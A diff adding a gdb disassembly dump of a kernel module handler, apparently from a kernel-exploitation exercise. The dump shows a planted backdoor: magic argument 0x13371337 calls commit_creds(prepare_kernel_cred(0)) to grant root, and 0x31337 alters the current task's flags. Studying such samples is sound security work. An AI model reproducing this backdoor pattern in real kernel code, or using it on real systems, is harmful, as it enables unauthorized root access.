@@ -1,0 +1,35 @@
+=> 0xffffffffc0005080:	push   %rbp
+   0xffffffffc0005081:	mov    $0xffffffffc0006022,%rdi
+   0xffffffffc0005088:	mov    %esi,%ebp
+   0xffffffffc000508a:	push   %rbx
+   0xffffffffc000508b:	mov    %rdx,%rbx
+   0xffffffffc000508e:	callq  0xffffffff810b69a9 <printk>
+   0xffffffffc0005093:	cmp    $0x7001,%ebp
+   0xffffffffc0005099:	jne    0xffffffffc0005104
+   0xffffffffc000509b:	cmp    $0x13371337,%rbx
+   0xffffffffc00050a2:	jne    0xffffffffc00050c1
+   0xffffffffc00050a4:	mov    $0xffffffffc000603b,%rdi
+   0xffffffffc00050ab:	callq  0xffffffff810b69a9 <printk>
+   0xffffffffc00050b0:	xor    %edi,%edi
+   0xffffffffc00050b2:
+    callq  0xffffffff81089660 <prepare_kernel_cred>
+   0xffffffffc00050b7:	mov    %rax,%rdi
+   0xffffffffc00050ba:	callq  0xffffffff81089310 <commit_creds>
+   0xffffffffc00050bf:	jmp    0xffffffffc0005104
+   0xffffffffc00050c1:	cmp    $0x31337,%rbx
+--Type <RET> for more, q to quit, c to continue without paging--
+   0xffffffffc00050c8:	jne    0xffffffffc0005104
+   0xffffffffc00050ca:	mov    $0xffffffffc0006053,%rdi
+   0xffffffffc00050d1:	callq  0xffffffff810b69a9 <printk>
+   0xffffffffc00050d6:	mov    $0xffffffffc0006067,%rdi
+   0xffffffffc00050dd:	mov    %gs:0x15d00,%rbx
+   0xffffffffc00050e6:	mov    (%rbx),%rsi
+   0xffffffffc00050e9:	callq  0xffffffff810b69a9 <printk>
+   0xffffffffc00050ee:	andq   $0xfffffffffffffeff,(%rbx)
+   0xffffffffc00050f5:	mov    (%rbx),%rsi
+   0xffffffffc00050f8:	mov    $0xffffffffc000607b,%rdi
+   0xffffffffc00050ff:	callq  0xffffffff810b69a9 <printk>
+   0xffffffffc0005104:	xor    %eax,%eax
+   0xffffffffc0005106:	pop    %rbx
+   0xffffffffc0005107:	pop    %rbp
+   0xffffffffc0005108:	retq
